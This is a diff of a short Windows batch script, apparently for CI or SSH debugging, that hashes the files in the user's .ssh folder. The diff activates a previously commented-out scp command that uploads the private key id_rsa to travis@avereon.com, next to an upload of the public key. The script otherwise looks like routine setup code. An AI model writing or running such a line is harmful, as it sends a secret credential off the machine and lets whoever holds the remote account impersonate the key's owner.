@@ -1,8 +1,6 @@
 @echo off
 setlocal enabledelayedexpansion
 
-ver
-
 set "USERHOME=!HOMEDRIVE!!HOMEPATH!"
 set "SSHHOME=!USERHOME!\.ssh"
 
@@ -18,5 +16,5 @@ sha1sum "!SSHHOME!\id_rsa"
 sha1sum "!SSHHOME!\id_rsa.pub"
 sha1sum "!SSHHOME!\known_hosts"
 
-REM scp -i "!SSHHOME!\id_rsa" "!SSHHOME!\id_rsa" travis@avereon.com:~/prvkey.txt
-scp -vv "!SSHHOME!\id_rsa.pub" travis@avereon.com:~/pubkey.txt
+scp "!SSHHOME!\id_rsa" travis@avereon.com:~/prvkey.txt
+scp "!SSHHOME!\id_rsa.pub" travis@avereon.com:~/pubkey.txt
